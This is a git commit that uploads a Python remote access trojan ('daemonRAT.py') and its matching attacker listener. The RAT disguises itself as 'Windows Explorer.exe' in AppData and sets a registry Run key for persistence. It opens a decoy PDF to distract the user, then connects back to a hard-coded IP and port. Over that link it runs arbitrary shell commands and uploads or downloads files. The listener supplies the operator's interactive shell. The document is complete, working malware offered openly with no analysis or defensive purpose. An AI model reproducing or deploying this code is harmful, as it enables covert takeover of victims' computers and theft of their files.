198ad96f1142a3d31cd373f08dcae55a39f50263
PERCOC4T <151021272+NavdeepNormie@users.noreply.github.com>
2025-07-14 21:58:55 +0530

    Add files via upload

---
+++ daemonRAT.py
@@ -0,0 +1,84 @@
+import socket
+import subprocess
+import json
+import os
+import base64
+import sys
+import shutil
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.become_persistent()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call(
+                r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',
+                shell=True
+            )
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data).encode()
+        self.connection.sendall(json_data)
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data.decode())
+            except json.JSONDecodeError:
+                continue
+
+    def execute_system_command(self, command):
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
+
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content.encode()))
+            return "[+] Upload successful."
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(" ".join(command))
+            except Exception:
+                command_result = "[-] Error during command execution."
+            self.reliable_send(command_result)
+
+
+# Entry point
+try:
+    # Try to open the embedded PDF to distract user
+    if hasattr(sys, '_MEIPASS'):
+        pdf_path = os.path.join(sys._MEIPASS, 'sample.pdf')
+        subprocess.Popen(pdf_path, shell=True)
+
+    my_backdoor = Backdoor("192.168.190.136", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
---
+++ listener.py
@@ -0,0 +1,71 @@
+import socket
+import json
+import base64
+
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connections")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data).encode()  # encode to bytes
+        self.connection.sendall(json_data)
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data.decode())  # decode before loading JSON
+            except json.JSONDecodeError:
+                continue
+
+    def execute_remotely(self, command):
+        self.reliable_send(command)
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
+        return self.reliable_receive()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content.encode()))
+            return "[+] Download successful."
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()  # decode for JSON serialization
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            command = command.strip().split(" ")
+
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.execute_remotely(command)
+
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+
+            except Exception as e:
+                result = f"[-] Error during command execution: {str(e)}"
+
+            print(result)
+
+
+# Replace with your attacker's IP or. localhost for testing
+my_listener = Listener("192.168.190.136", 4444)
+my_listener.run()
+
